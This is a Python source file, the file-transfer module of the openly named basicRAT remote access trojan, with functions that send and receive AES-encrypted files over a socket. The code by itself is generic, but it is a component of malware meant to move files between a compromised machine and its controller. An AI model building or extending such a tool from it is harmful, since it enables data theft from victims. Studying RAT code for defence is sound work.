# -*- coding: utf-8 -*-

#
# basicRAT file module
# https://github.com/vesche/basicRAT
#
import struct
import socket

# temporary
from crypto import AES_encrypt as encrypt
from crypto import AES_decrypt as decrypt


# recv a file from a socket.
def recvfile(sock, fname, key):
    with open(fname, 'wb') as f:
        datasize = struct.unpack("!I", sock.recv(4))[0]
        while datasize:
            res = sock.recv(datasize)
            f.write(decrypt(res, key))
            datasize = struct.unpack("!I", sock.recv(4))[0]
            
#send a file over a socket   
def sendfile(sock, fname, key):
    with open(fname, 'rb') as f:
        res = f.read(4096)
        while len(res):
            enc_res = encrypt(res, key)
            sock.send(struct.pack("!I", len(enc_res)))
            sock.send(enc_res)
            res = f.read(4096)
        sock.send('\x00\x00\x00\x00') # EOF